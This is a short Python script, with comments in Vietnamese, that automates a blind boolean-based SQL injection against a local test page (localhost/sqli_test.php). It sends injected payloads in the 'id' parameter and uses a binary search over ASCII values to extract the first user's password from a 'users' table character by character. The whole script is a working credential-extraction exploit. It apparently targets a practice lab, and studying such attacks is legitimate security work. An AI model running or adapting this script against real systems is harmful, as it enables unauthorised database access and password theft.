import requests

# ✅ Tùy chỉnh lại tùy phản hồi trang
def is_true(payload):
    url = "http://localhost/sqli_test.php"
    full_url = url + "?id=" + payload
    r = requests.get(full_url)

    # In để debug kết quả trả về
    print(f"[DEBUG] URL: {full_url} | Length: {len(r.text)}")

    # ✅ Nếu kết quả "Không có kết quả." thì là FALSE
    # ✅ Nếu có dữ liệu in ra (gồm "Array" hoặc username) → TRUE
    return "username" in r.text
# Hàm dùng binary search để dò ký tự tại vị trí `pos`
def binary_search_char(pos):
    low, high = 32, 126  # ASCII printable range
    while low <= high:
        mid = (low + high) // 2
        # Truy vấn boolean: ký tự thứ pos > mid?
        payload = f"1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),{pos},1)) > {mid} -- "
        if is_true(payload):
            low = mid + 1
        else:
            payload_eq = f"1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),{pos},1)) = {mid} -- "
            if is_true(payload_eq):
                return chr(mid)
            else:
                high = mid - 1
    return ''

# Dò toàn bộ chuỗi
def dump_field(max_len=50):
    result = ''
    for i in range(1, max_len + 1):
        c = binary_search_char(i)
        if c == '':
            break
        result += c
        print(f"[{i}] -> {c} => {result}")
    return result

# 👉 Bắt đầu dò email
print("\n[+] Dumping password from user 0:")
password = dump_field()
print("\n✅ Password:", password)
